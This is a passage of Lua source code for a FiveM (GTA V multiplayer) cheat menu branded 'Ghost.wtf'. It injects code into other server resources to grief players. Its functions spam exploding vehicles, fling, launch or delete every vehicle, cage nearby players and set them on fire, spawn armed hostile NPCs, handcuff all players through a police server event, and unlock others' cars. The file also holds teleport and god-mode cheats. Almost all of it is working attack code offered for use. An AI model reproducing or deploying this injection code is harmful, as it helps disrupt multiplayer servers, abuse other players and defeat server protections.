                    local pos = GetEntityCoords(PlayerPedId())
                    local veh = CreateVehicle(model, pos.x + %d, pos.y + %d, pos.z, math.random(0, 360), true, false)
                    SetVehicleDoorsLocked(veh, 2)
                    SetVehicleNumberPlateText(veh, "GHOST.WTF")
                    SetEntityAsMissionEntity(veh, true, true)
                    SetVehicleOnGroundProperly(veh)
                    SetEntityInvincible(veh, true)
                    SetEntityCollision(veh, true, true)

                    -- Explode the vehicle immediately
                    Wait(100)  -- Short wait for vehicle to spawn
                    AddExplosion(GetEntityCoords(veh), 4, 50.0, true, false, 1.0, false)  -- Explosion after spawn
                end
                GhostTugSpam()
            ]], offsetX, offsetY)

            MachoInjectResource("any", code)

            count = count + 1
            Wait(0)
        end
    end)

    MachoMenuNotification("Ghost.wtf", "Spam Random Vehicles ON")
end,

function()
    TugSpamActive = false
    MachoMenuNotification("Ghost.wtf", "Spam Random Vehicles OFF")
end)

MachoMenuCheckbox(ServerSection2, "Plane Spammer", function() 
    local TugSpamActive = true  

    CreateThread(function()
        local model = 'Tug'
        RequestModel(model)

        while not HasModelLoaded(model) do
            Wait(0)
        end

        local count = 0
        while TugSpamActive and count < 6500 do  -- Higher spawn count, can adjust as needed
            local pos = GetEntityCoords(PlayerPedId())
            local offsetX = math.random(-15, 15)
            local offsetY = math.random(-15, 15)

            local code = string.format([[
                function GhostTugSpam()
                    local model = 'Tug'
                    RequestModel(model)
                    while not HasModelLoaded(model) do Wait(0) end

                    local pos = GetEntityCoords(PlayerPedId())
                    local veh = CreateVehicle(model, pos.x + %d, pos.y + %d, pos.z, math.random(0, 360), true, false)
                    SetVehicleDoorsLocked(veh, 2)
                    SetVehicleNumberPlateText(veh, "GHOST.WTF")
                    SetEntityAsMissionEntity(veh, true, true)
                    SetVehicleOnGroundProperly(veh)
                    SetEntityInvincible(veh, true)
                    SetEntityCollision(veh, true, true)

                    -- Explode the vehicle immediately
                    Wait(50)  -- Short wait for vehicle to spawn
                    AddExplosion(GetEntityCoords(veh), 4, 50.0, true, false, 1.0, false)  -- Explosion after spawn
                end
                GhostTugSpam()
            ]], offsetX, offsetY)

            MachoInjectResource("any", code)

            count = count + 1
            Wait(0)
        end
    end)

    MachoMenuNotification("Ghost.wtf", "Spam Random Vehicles ON")
end,

function()
    TugSpamActive = false
    MachoMenuNotification("Ghost.wtf", "Spam Random Vehicles OFF")
end)


local CarFlingActive = false
local CarFlingThreadActive = false
local CarFlingThread = nil

MachoMenuCheckbox(ServerSection2, "Car Chaos",
    function()
        if not CarFlingThreadActive then
            CarFlingActive = true
            CarFlingThreadActive = true

            function EnumerateVehicles()
                return coroutine.wrap(function()
                    local handle, veh = FindFirstVehicle()
                    if not handle or handle == -1 then return end
                    local success
                    repeat
                        coroutine.yield(veh)
                        success, veh = FindNextVehicle(handle)
                    until not success
                    EndFindVehicle(handle)
                end)
            end

            -- Create the Car Flinging thread
            CarFlingThread = CreateThread(function()
                while CarFlingActive do
                    local player = PlayerPedId()
                    local origin = GetEntityCoords(player)

                    for veh in EnumerateVehicles() do
                        if DoesEntityExist(veh) and veh ~= GetVehiclePedIsIn(player, false) then
                            local coords = GetEntityCoords(veh)
                            local dist = #(coords - origin)

                            if dist < 80.0 then
                                SetEntityAsMissionEntity(veh, true, true)
                                SetVehicleEngineOn(veh, true, true, false)
                                SetEntityInvincible(veh, true)
                                SetEntityCollision(veh, false, false)

                                local dir = coords - origin
                                local norm = dir / #dir

                                local fx = norm.x * math.random(90, 140)
                                local fy = norm.y * math.random(90, 140)
                                local fz = math.random(40, 70)

                                -- Apply force to fling the vehicle
                                ApplyForceToEntity(veh, 1, fx, fy, fz, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                SetVehicleOutOfControl(veh, true, true)
                            end
                        end
                    end

                    -- Give some delay to avoid performance issues
                    Wait(500)
                end

                CarFlingThreadActive = false
            end)
        end

        MachoMenuNotification("Ghost.wtf", "Flinging nearby vehicles enabled.")
    end,

    function()
        -- Disable car fling logic
        CarFlingActive = false
        if CarFlingThreadActive then
            -- Safely stop the thread
            if CarFlingThread then
                TerminateThread(CarFlingThread)
            end
            CarFlingThreadActive = false
        end
        MachoMenuNotification("Ghost.wtf", "Car flinging disabled.")
    end
)

local selectedVehicleIndex = 0

MachoMenuDropDown(ServerSection2, "Select Vehicle", function(selectedIndex)
    selectedVehicleIndex = selectedIndex
end, "tug", "luxor", "buzzard", "avenger", "blimp", "bus", "stunt")

MachoMenuButton(ServerSection2, "Spawn Vehicle On All Players", function()
    local vehicleList = {
        [0] = "tug",
        [1] = "luxor",
        [2] = "buzzard",
        [3] = "avenger",
        [4] = "blimp",
        [5] = "bus",
        [6] = "stunt"
    }

    local selectedVehicle = vehicleList[selectedVehicleIndex]
    if not selectedVehicle then
        MachoMenuNotification("Ghost.wtf", "Invalid vehicle selected.")
        return
    end

    local code = string.format([[
        function GhostSpawnVehiclesonPlayers()
            CreateThread(function()
                local vehicle = "%s"

                local function randomFloat(min, max)
                    return min + math.random() * (max - min)
                end

                local function spawnVehicleOnPlayer(ped, hash)
                    local coords = GetEntityCoords(ped)
                    if coords.z > -50.0 and coords.z < 1000.0 then
                        for i = 1, 6 do
                            local x = coords.x + randomFloat(-3.0, 3.0)
                            local y = coords.y + randomFloat(-3.0, 3.0)
                            local z = coords.z + 1.5

                            local veh = CreateVehicle(hash, x, y, z, 0.0, false, false)
                            if DoesEntityExist(veh) then
                                SetEntityAsMissionEntity(veh, true, true)
                                SetVehicleOnGroundProperly(veh)
                                SetEntityVisible(veh, true)
                                FreezeEntityPosition(veh, false)
                            end
                        end
                    end
                end

                local hash = GetHashKey(vehicle)
                RequestModel(hash)
                local timeout = GetGameTimer() + 5000
                while not HasModelLoaded(hash) and GetGameTimer() < timeout do
                    Wait(0)
                end

                if HasModelLoaded(hash) then
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(playerId)
                        if ped and DoesEntityExist(ped) then
                            spawnVehicleOnPlayer(ped, hash)
                            Wait(math.random(300, 600))
                        end
                    end

                    SetModelAsNoLongerNeeded(hash)
                end
            end)
        end

        GhostSpawnVehiclesonPlayers()
    ]], selectedVehicle)

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Spawning vehicle on all players: " .. selectedVehicle)
end)

MachoMenuButton(ServerSection2, "Launch All Vehicles", function()
    local code = [[
        function LaunchAllVehicles()
            CreateThread(function()
                local handle, veh = FindFirstVehicle()
                if handle == -1 then return end

                local success = true
                repeat
                    if DoesEntityExist(veh) then
                        ApplyForceToEntity(veh, 1, 0.0, 0.0, 1000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                    end
                    success, veh = FindNextVehicle(handle)
                until not success

                EndFindVehicle(handle)
            end)
        end

        LaunchAllVehicles()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "All vehicles launched upward.")
end)

MachoMenuButton(ServerSection2, "Bring All Vehicles To You (OP)", function()
    MachoInjectResource("any", [[
        local function EnumerateVehicles()
            local handle, veh = FindFirstVehicle()
            if handle == -1 then return end

            local success
            repeat
                if DoesEntityExist(veh) then
                    DeleteEntity(veh)
                end
                success, veh = FindNextVehicle(handle)
            until not success
            EndFindVehicle(handle)
        end

        EnumerateVehicles()
    ]])
    MachoMenuNotification("Ghost.wtf", "VEHICLES ALL BRANG TO YOU OVERPOWERED")
end)

MachoMenuButton(ServerSection2, "Cage and Burn All Nearby", function()
    local ped = PlayerPedId()
    local myCoords = GetEntityCoords(ped)
    local cageModel = "prop_gold_cont_01"

    for _, playerId in ipairs(GetActivePlayers()) do
        local targetPed = GetPlayerPed(playerId)
        if targetPed ~= ped and DoesEntityExist(targetPed) then
            local coords = GetEntityCoords(targetPed)
            local dist = #(coords - myCoords)

            if dist < 30.0 then
                MachoInjectResourceRaw("any", string.format([[
                    local model = "%s"
                    RequestModel(model)
                    while not HasModelLoaded(model) do Wait(0) end

                    local pos = vector3(%f, %f, %f - 1.0)
                    local obj = CreateObject(GetHashKey(model), pos.x, pos.y, pos.z, true, true, true)

                    PlaceObjectOnGroundProperly(obj)
                    SetEntityAsMissionEntity(obj, true, true)
                    FreezeEntityPosition(obj, true)
                    SetEntityVisible(obj, true)

                    local netId = ObjToNet(obj)
                    if netId and netId ~= 0 then
                        SetNetworkIdExistsOnAllMachines(netId, true)
                        SetNetworkIdCanMigrate(netId, true)
                    end

                    
                    local nearbyPeds = GetGamePool("CPed")
                    for _, ped in ipairs(nearbyPeds) do
                        if DoesEntityExist(ped) and not IsPedAPlayer(ped) == false then
                            local pedCoords = GetEntityCoords(ped)
                            if #(pedCoords - vector3(%f, %f, %f)) < 3.0 then
                                StartEntityFire(ped)
                            end
                        end
                    end
                ]], cageModel, coords.x, coords.y, coords.z, coords.x, coords.y, coords.z))
            end
        end
    end

    MachoMenuNotification("Ghost.wtf", "Caged and set fire to all nearby players.")
end)

MachoMenuButton(ServerSection2, "Cage All Nearby", function()
    local myPed = PlayerPedId()
    local myCoords = GetEntityCoords(myPed)

    local code = string.format([[
        function GhostCageAllNearby()
            CreateThread(function()
                local model = "prop_gold_cont_01"
                local modelHash = GetHashKey(model)
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do Wait(0) end

                local myId = PlayerId()
                local myCoords = GetEntityCoords(PlayerPedId())

                for _, pid in ipairs(GetActivePlayers()) do
                    if pid ~= myId then
                        local targetPed = GetPlayerPed(pid)
                        if DoesEntityExist(targetPed) then
                            local coords = GetEntityCoords(targetPed)
                            if #(coords - myCoords) <= 30.0 then
                                local obj = CreateObjectNoOffset(modelHash, coords.x, coords.y, coords.z - 1.0, true, true, false)

                                SetEntityAsMissionEntity(obj, true, true)
                                FreezeEntityPosition(obj, true)
                                SetEntityDynamic(obj, false)
                                PlaceObjectOnGroundProperly(obj)
                                SetModelAsNoLongerNeeded(modelHash)

                                local netId = ObjToNet(obj)
                                if NetworkDoesNetworkIdExist(netId) then
                                    SetNetworkIdCanMigrate(netId, true)
                                    SetNetworkIdExistsOnAllMachines(netId, true)
                                    NetworkRequestControlOfNetworkId(netId)
                                end
                            end
                        end
                        Wait(50)
                    end
                end
            end)
        end

        GhostCageAllNearby()
    ]])

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Caged all nearby players.")
end)

--// Server Section 3 \\--

MachoMenuButton(ServerSection3, "Cuff All (crashes you)", function() 
    local code = [[

        function GhostJail()
            CreateThread(function()
                if GetResourceState("wasabi_police") == "started" then
                TriggerServerEvent('wasabi_police:handcuffPlayer', -1, 'hard')
                end
            end)
        end

        GhostJail()
    ]]
    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost", "Cuffed all")
end)

--// Teleport Tab \\--

local enteredCoords = nil
local copiedCoords = nil

MachoMenuInputbox(TeleportTab, "Enter Coordinates (vec3 or vec4)", "", function(input)
    local coords = {}
    local success, msg = pcall(function()
        if input:match("vector4") then
            coords = {x = tonumber(input:match("vector4%((.-),")), 
                      y = tonumber(input:match(",%s*([%d%.%-]+),")), 
                      z = tonumber(input:match(",%s*([%d%.%-]+),")), 
                      heading = tonumber(input:match(",%s*([%d%.%-]+)%s*%)"))}
        elseif input:match("vector3") then
            coords = {x = tonumber(input:match("vector3%((.-),")), 
                      y = tonumber(input:match(",%s*([%d%.%-]+),")), 
                      z = tonumber(input:match(",%s*([%d%.%-]+)%s*%)"))}
            coords.heading = 0.0
        end
    end)
    
    if success and coords.x and coords.y and coords.z then
        enteredCoords = coords
    else
        MachoMenuNotification("Error", "Invalid Coordinates Format")
    end
end)

MachoMenuButton(TeleportTab, "Teleport to Entered Coords", function()
    if enteredCoords then
        SetEntityCoords(PlayerPedId(), enteredCoords.x, enteredCoords.y, enteredCoords.z + 1.0)
        SetEntityHeading(PlayerPedId(), enteredCoords.heading)
        MachoMenuNotification("Success", "Teleported to entered coordinates.")
    else
        MachoMenuNotification("Error", "No valid coordinates entered.")
    end
end)

MachoMenuButton(TeleportTab, "Teleport to Comserv Boat", function()
    SetEntityCoords(PlayerPedId(), 3380.18, -681.19, 42.0)
    MachoMenuNotification("Success", "Teleported to Community Service Boat")
end)

MachoMenuButton(TeleportTab, "Teleport to MRPD", function()
    SetEntityCoords(PlayerPedId(), 441.2, -981.9, 30.7)
    MachoMenuNotification("Success", "Teleported to MRPD")
end)

MachoMenuButton(TeleportTab, "Teleport to Legion", function()
    SetEntityCoords(PlayerPedId(), 215.76, -810.12, 30.73)
    MachoMenuNotification("Success", "Teleported to Legion Square")
end)

MachoMenuButton(TeleportTab, "Teleport to Sandy Shores", function()
    SetEntityCoords(PlayerPedId(), 1854.35, 3686.46, 34.27)
    MachoMenuNotification("Success", "Teleported to Sandy Shores")
end)

MachoMenuButton(TeleportTab, "Teleport to Paleto", function()
    SetEntityCoords(PlayerPedId(), -448.0, 6023.45, 31.72)
    MachoMenuNotification("Success", "Teleported to Paleto")
end)

MachoMenuButton(TeleportTab, "Teleport to Waypoint", function()
    local waypoint = GetFirstBlipInfoId(8)
    if DoesBlipExist(waypoint) then
        local coord = GetBlipInfoIdCoord(waypoint)
        SetEntityCoords(PlayerPedId(), coord.x, coord.y, coord.z + 1.0)
    else
        MachoMenuNotification("Error", "No waypoint set.")
    end
end)

MachoMenuButton(TeleportTab, "Copy Current Coords", function()
    local coords = GetEntityCoords(PlayerPedId())
    local heading = GetEntityHeading(PlayerPedId())
    copiedCoords = {x = coords.x, y = coords.y, z = coords.z, heading = heading}
    local coordString = string.format("vector4(%.2f, %.2f, %.2f, %.2f)", coords.x, coords.y, coords.z, heading)
    printsuccess("Copied Coords: " .. coordString)
    MachoMenuNotification("Success", "Copied current coordinates to clipboard.")
end)

MachoMenuButton(TeleportTab, "Teleport to Copied Coords", function()
    if copiedCoords then
        SetEntityCoords(PlayerPedId(), copiedCoords.x, copiedCoords.y, copiedCoords.z + 1.0)
        SetEntityHeading(PlayerPedId(), copiedCoords.heading)
        MachoMenuNotification("Success", "Teleported to copied coordinates.")
    else
        MachoMenuNotification("Error", "No coordinates copied.")
    end
end)



--// Vehicle Tab \\--

local CarText = MachoMenuInputbox(VehicleSection1, "Car Model", "Ghost")

MachoMenuButton(VehicleSection1, "Spawn Car", function()
    local code = [[
        function GhostSpawnCar()
            CreateThread(function()
                local modelName = MachoMenuGetInputbox("Enter Vehicle Model")

                local playerPed = PlayerPedId()
                local vehicleModel = GetHashKey(modelName)

                RequestModel(vehicleModel)
                while not HasModelLoaded(vehicleModel) do
                    Wait(0)
                end

                local playerPos = GetEntityCoords(playerPed)
                local heading = GetEntityHeading(playerPed)

                local spawnX = playerPos.x + 5 * math.cos(math.rad(heading))
                local spawnY = playerPos.y + 5 * math.sin(math.rad(heading))

                local vehicle = CreateVehicle(vehicleModel, spawnX, spawnY, playerPos.z, heading, true, false)
                SetVehicleOnGroundProperly(vehicle)
                SetModelAsNoLongerNeeded(vehicleModel)

                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
            end)
        end

        GhostSpawnCar()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Spawn Car executed.")
end)

MachoMenuButton(VehicleSection1, "Spawn Npc Driven Car", function() 
    local modelName = MachoMenuGetInputbox("Enter Vehicle Model")

    local code = string.format([[
        function GhostSpawnNpcDrivenCar()
            CreateThread(function()
                local playerPed = PlayerPedId()
                local vehicleModel = "%s"
                local npcModel = 'a_m_m_business_01'

                RequestModel(vehicleModel)
                while not HasModelLoaded(vehicleModel) do Wait(0) end

                RequestModel(npcModel)
                while not HasModelLoaded(npcModel) do Wait(0) end

                local playerPos = GetEntityCoords(playerPed)
                local heading = GetEntityHeading(playerPed)
                local spawnPos = vector3(playerPos.x + 5.0, playerPos.y + 5.0, playerPos.z)

                local vehicle = CreateVehicle(vehicleModel, spawnPos.x, spawnPos.y, spawnPos.z, heading, true, false)
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleEngineOn(vehicle, true, true, false)
                ModifyVehicleTopSpeed(vehicle, 50.0)
                SetVehicleForwardSpeed(vehicle, 5.0)

                local driver = CreatePed(4, npcModel, spawnPos.x, spawnPos.y, spawnPos.z, heading, true, false)
                SetEntityAsMissionEntity(driver, true, true)
                SetPedIntoVehicle(driver, vehicle, -1)

                SetPedCombatAttributes(driver, 3, true)
                SetPedCombatAttributes(driver, 5, true)
                SetPedCombatAttributes(driver, 46, true)
                SetPedCombatRange(driver, 2)
                SetPedAccuracy(driver, 100)
                SetPedCombatMovement(driver, 3)
                SetPedCombatAbility(driver, 100)
                SetPedConfigFlag(driver, 281, true)
                SetPedConfigFlag(driver, 2, true)
                SetPedConfigFlag(driver, 33, false)

                GiveWeaponToPed(driver, GetHashKey("WEAPON_MICROSMG"), 999, false, true)
                SetPedArmour(driver, 100)
                SetPedMaxHealth(driver, 500)
                SetEntityHealth(driver, 500)

                SetDriverAbility(driver, 1.0)
                SetDriverAggressiveness(driver, 1.0)
                TaskVehicleDriveWander(driver, vehicle, 80.0, 786987)
                SetPedKeepTask(driver, true)

                SetModelAsNoLongerNeeded(vehicleModel)
                SetModelAsNoLongerNeeded(npcModel)

                CreateThread(function()
                    while true do
                        Wait(1000)
                        local nearbyPeds = GetGamePool("CPed")
                        for _, ped in pairs(nearbyPeds) do
                            if ped ~= driver and ped ~= playerPed and not IsPedInAnyVehicle(ped, true) then
                                TaskCombatPed(driver, ped, 0, 16)
                            end
                        end
                    end
                end)
            end)
        end

        GhostSpawnNpcDrivenCar()
    ]], modelName)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Spawn Npc Driven Car trigger executed.")
end)


--// Vehicle Section 2 \\--

local EngineToggle = false

MachoMenuCheckbox(VehicleSection2, "Engine Always On", 
    function()
        EngineToggle = true
        Citizen.CreateThread(function()
            while EngineToggle do
                MachoInjectResource("any", [[
                    local ped = PlayerPedId()
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleEngineOn(vehicle, true, true, false)
                    end
                ]])
                Citizen.Wait(30)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Engine Always On enabled")
    end,

    function()
        EngineToggle = false
        MachoMenuNotification("Ghost.wtf", "Engine Always On disabled")
    end
)

local VehicleGodModeToggle = false

MachoMenuCheckbox(VehicleSection2, "Vehicle God Mode",
    function()
        VehicleGodModeToggle = true
        Citizen.CreateThread(function()
            while VehicleGodModeToggle do
                MachoInjectResource("any", [[
                    local ped = PlayerPedId()
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetEntityInvincible(vehicle, true)
                        SetVehicleCanBeVisiblyDamaged(vehicle, false)
                    end
                ]])
                Citizen.Wait(30)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Vehicle God Mode enabled")
    end,

    function()
        VehicleGodModeToggle = false
        MachoInjectResource("any", [[
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle and DoesEntityExist(vehicle) then
                SetEntityInvincible(vehicle, false)
                SetVehicleCanBeVisiblyDamaged(vehicle, true)
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "Vehicle God Mode disabled")
    end
)

MachoMenuCheckbox(VehicleSection2, "No Vehicle Gravity (WIP)", function() 
    local code = [[
        function GhostNoVehicleGravity()
            CreateThread(function()
                local noVehicleGravityToggle = true

                Citizen.CreateThread(function()
                    while noVehicleGravityToggle do
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                        if DoesEntityExist(vehicle) then
                            SetVehicleGravityAmount(vehicle, 0.0)  -- Set gravity to 0 (No gravity effect on the vehicle)
                        end
                        Citizen.Wait(30)
                    end
                end)
            end)
        end

        GhostNoVehicleGravity()
    ]]

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "No Vehicle Gravity is now active.")
end, function() 
    local code = [[
        function StopNoVehicleGravity()
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                SetVehicleGravityAmount(vehicle, 1.0)  -- Reset gravity back to normal
            end
        end

        StopNoVehicleGravity()
    ]]

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "No Vehicle Gravity is now inactive.")
end)

MachoMenuCheckbox(VehicleSection2, "No Shot in Veh", function() 
    local code = [[
        function GhostNoShotinVeh()
            CreateThread(function()
                local noShotInVehicleToggle = true

                Citizen.CreateThread(function()
                    while noShotInVehicleToggle do
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            SetPedCanBeShotInVehicle(ped, false)
                        end
                        Citizen.Wait(30)
                    end
                end)
            end)
        end

        GhostNoShotinVeh()
    ]]

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "No Shot in Vehicle is now active.")
end, function() 
    local code = [[
        function StopNoShotinVeh()
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetPedCanBeShotInVehicle(ped, true)
            end
        end

        StopNoShotinVeh()
    ]]

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "No Shot in Vehicle is now inactive.")
end)

MachoMenuCheckbox(VehicleSection2, "Seatbelt", function() 
    local code = [[
        function GhostSeatbelt()
            CreateThread(function()
                local SeatbeltToggle = true

                Citizen.CreateThread(function()
                    while SeatbeltToggle do
                        local ped = PlayerPedId()
                        local vehicle = GetVehiclePedIsIn(ped, false)
                        if DoesEntityExist(vehicle) then
                            SetEntityInvincible(vehicle, true)
                            SetVehicleCanBeVisiblyDamaged(vehicle, false)
                            SetVehicleDoorsLocked(vehicle, 1)
                            SetVehicleGravity(vehicle, 0.1)
                            SetEntityCollision(vehicle, false)
                            if IsPedInVehicle(ped, vehicle, false) then
                                SetEntityCollision(vehicle, true, true)
                            end
                        end
                        Citizen.Wait(30)
                    end
                end)
            end)
        end

        GhostSeatbelt()
    ]]

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Seatbelt triggers executed")
end, function() 
    local code = [[
        function StopSeatbelt()
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if DoesEntityExist(vehicle) then
                SetEntityInvincible(vehicle, false)
                SetVehicleCanBeVisiblyDamaged(vehicle, true)
                SetVehicleDoorsLocked(vehicle, 0)
                SetEntityCollision(vehicle, true, true)
                SetVehicleGravity(vehicle, 1.0)
            end
        end

        StopSeatbelt()
    ]]
    
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Seatbelt is now inactive.")
end)


MachoMenuButton(VehicleSection2, "Unlock Nearest Vehicle", function() 
    local code = [[
        function GhostUnlockNearestVehicle()
            CreateThread(function()
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                if DoesEntityExist(vehicle) then
                    SetVehicleDoorsLocked(vehicle, 1)  -- Unlock the vehicle
                    SetVehicleDoorsLockedForAllPlayers(vehicle, false)  -- Unlock for all players
                end
            end)
        end

        GhostUnlockNearestVehicle()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Unlock Nearest Vehicle triggers executed")
end)

MachoMenuButton(VehicleSection2, "Turn Off Nearest Vehicle's Engine", function() 
    local code = [[
        function GhostTurnOffNearestVehicleEngine()
            CreateThread(function()
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                if DoesEntityExist(vehicle) then
                    SetVehicleEngineOn(vehicle, false, true, true)
                end
            end)
        end

        GhostTurnOffNearestVehicleEngine()
    ]]
    
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Turn Off Nearest Vehicle's Engine triggers executed")
end)

--// Vehicle Section 3 \\--

local PlateText = MachoMenuInputbox(VehicleSection3, "Plate", "Ghost")

MachoMenuButton(VehicleSection3, "Change Plate", function()
    local plate = MachoMenuGetInputbox(PlateText)
    MachoInjectResource("any", string.format([[
        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(vehicle) then
            SetVehicleNumberPlateText(vehicle, "%s")
        end
    ]], plate))
end)

MachoMenuButton(VehicleSection2, "Repair Vehicle", function()
    local ped = PlayerPedId()
    if not IsPedInAnyVehicle(ped, false) then
        MachoMenuNotification("Ghost.wtf", "You need to be inside a vehicle to repair it.")
        return
    end
    local veh = GetVehiclePedIsIn(ped, false)
    local netId = VehToNet(veh)
    if netId then
        TriggerServerEvent("ghost:server:repairVehicle", netId)
        MachoMenuNotification("Ghost.wtf", "Repair Vehicle request sent to server.")
    else
        SetVehicleFixed(veh)
        SetVehicleDeformationFixed(veh)
        SetVehicleEngineHealth(veh, 1000.0)
        SetVehiclePetrolTankHealth(veh, 1000.0)
        SetVehicleDirtLevel(veh, 0.0)
        MachoMenuNotification("Ghost.wtf", "Vehicle repaired client-side only.")
    end
end)

MachoMenuButton(VehicleSection3, "Max Engine Tune", function() 
    local code = [[
        function GhostMaxEngineTune()
            CreateThread(function()
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                if DoesEntityExist(vehicle) then
                    SetVehicleModKit(vehicle, 0)
                    SetVehicleMod(vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false)
                    SetVehicleMod(vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false)
                    SetVehicleMod(vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false)
                    SetVehicleMod(vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false)
                    SetVehicleMod(vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false)
                    ToggleVehicleMod(vehicle, 17, true)
                    ToggleVehicleMod(vehicle, 18, true)
                    ToggleVehicleMod(vehicle, 19, true)
                    ToggleVehicleMod(vehicle, 21, true)
                    SetVehicleTyresCanBurst(vehicle, false)
                end
            end)
        end

        GhostMaxEngineTune()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Max Engine Tune triggers executed")
end)

local DriftModeToggle = false

MachoMenuCheckbox(VehicleSection3, "Drift Mode", function()
    if not DriftModeToggle then
        DriftModeToggle = true
        Citizen.CreateThread(function()
            while DriftModeToggle do
                if IsPedInAnyVehicle(PlayerPedId(), false) then
                    MachoInjectResource("any", [[
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                        SetVehicleGravityAmount(vehicle, 5.0)
                    ]])
                end
                Citizen.Wait(30)
            end
        end)

        MachoMenuNotification("Ghost.wtf", "Drift Mode is now active!")
    else
        DriftModeToggle = false
        if IsPedInAnyVehicle(PlayerPedId(), false) then
            MachoInjectResource("any", [[
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                SetVehicleGravityAmount(vehicle, 10.0)
            ]])
        end

        MachoMenuNotification("Ghost.wtf", "Drift Mode is now inactive.")
    end
end)

MachoMenuSlider(VehicleSection3, "Torque Multiplier", 1, 1, 1000, "", 1, function(value)
    TorqueAmount = value
end)

MachoMenuCheckbox(VehicleSection3, "Use Torque", function() 
    local code = [[
        function GhostUseTorque()
            CreateThread(function()
                local TorqueAmount = 10.0  -- You can adjust this value for more/less torque

                local SpeedUpCarToggle = true
                Citizen.CreateThread(function()
                    while SpeedUpCarToggle do
                        local ped = PlayerPedId()
                        local vehicle = GetVehiclePedIsIn(ped, false)
                        if DoesEntityExist(vehicle) then
                            SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDriveForce", TorqueAmount)
                            SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveInertia", 1.0)
                        end
                        Citizen.Wait(500)  -- Adjust this for how fast the torque updates
                    end
                end)
            end)
        end

        function StopUseTorque()
            SpeedUpCarToggle = false
        end

        GhostUseTorque()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Use Torque triggers executed")
end)

MachoMenuButton(VehicleSection3, "Max Aesthetic Tune", function() 
    local code = [[
        function GhostMaxAestheticTune()
            CreateThread(function()
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                if DoesEntityExist(vehicle) then
                    SetVehicleModKit(vehicle, 0)  -- Set the mod kit to the default one
                    for i = 0, 12 do
                        SetVehicleMod(vehicle, i, GetNumVehicleMods(vehicle, i) - 1, false)  -- Max out all vehicle mods
                    end
                    SetVehicleWindowTint(vehicle, 1)  -- Set window tint to dark
                    SetVehicleXenonLightsColor(vehicle, 5)  -- Set Xenon lights to blue
                    SetVehicleLights(vehicle, 2)  -- Set vehicle lights to 'neon' mode
                    SetVehicleCustomPrimaryColour(vehicle, 255, 0, 0)  -- Set primary color to red
                    SetVehicleCustomSecondaryColour(vehicle, 0, 0, 255)  -- Set secondary color to blue
                end
            end)
        end

        GhostMaxAestheticTune()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Max Aesthetic Tune triggers executed")
end)

MachoMenuButton(VehicleSection3, "Clean Car", function() 
    local code = [[
        function GhostCleanCar()
            CreateThread(function()
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                if DoesEntityExist(vehicle) then
                    SetVehicleDirtLevel(vehicle, 0.0)  -- Cleans the vehicle by setting the dirt level to 0
                end
            end)
        end

        GhostCleanCar()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Clean Car triggers executed")
end)


MachoMenuButton(VehicleSection3, "Delete Car", function() 
    local code = [[
        function GhostDeleteCar()
            CreateThread(function()
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                if DoesEntityExist(vehicle) then
                    SetEntityAsMissionEntity(vehicle, true, true)
